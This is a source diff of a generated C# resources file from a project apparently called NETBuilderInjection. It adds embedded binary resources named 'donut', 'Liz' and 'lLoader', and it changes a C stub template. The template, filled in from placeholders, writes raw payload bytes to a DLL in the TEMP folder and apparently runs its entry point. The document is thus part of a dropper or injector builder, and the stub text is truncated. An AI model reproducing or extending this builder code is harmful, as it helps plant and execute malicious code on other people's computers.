@@ -73,9 +73,39 @@ namespace NETBuilderInjection.Properties {
         /// <summary>
         ///   Looks up a localized resource of type System.Byte[].
         /// </summary>
+        internal static byte[] donut {
+            get {
+                object obj = ResourceManager.GetObject("donut", resourceCulture);
+                return ((byte[])(obj));
+            }
+        }
+        
+        /// <summary>
+        ///   Looks up a localized resource of type System.Byte[].
+        /// </summary>
         internal static byte[] libz {
             get {
                 object obj = ResourceManager.GetObject("libz", resourceCulture);
+                return ((byte[])(obj));
+            }
+        }
+        
+        /// <summary>
+        ///   Looks up a localized resource of type System.Byte[].
+        /// </summary>
+        internal static byte[] Liz {
+            get {
+                object obj = ResourceManager.GetObject("Liz", resourceCulture);
+                return ((byte[])(obj));
+            }
+        }
+        
+        /// <summary>
+        ///   Looks up a localized resource of type System.Byte[].
+        /// </summary>
+        internal static byte[] lLoader {
+            get {
+                object obj = ResourceManager.GetObject("lLoader", resourceCulture);
                 return ((byte[])(obj));
             }
         }
@@ -91,10 +121,9 @@ namespace NETBuilderInjection.Properties {
         ///	$DataByte$
         ///};
         ///
-        ///
         ///int main()
         ///{
-        ///
+        ///	bool Conditional = false;
         ///	char *Pathvar = getenv(&quot;TEMP&quot;);
         ///	char *DLLName = &quot;$DllName$&quot;;
         ///	char *EntryPoint = &quot;$DllMain$&quot;;
@@ -110,9 +139,7 @@ namespace NETBuilderInjection.Properties {
         ///	FILE *fp = fopen(DLLName, &quot;wb&quot;);
         ///   
         ///	if (fp) {
-        ///		fwrite(rawData, 1, sizeof(rawData), fp);
-        ///		fclose(fp);
-        ///	 [rest of string was truncated]&quot;;.
+        ///		fwrite(rawData, 1, sizeof(rawData) [rest of string was truncated]&quot;;.
         /// </summary>
         internal static string Stub {
             get {
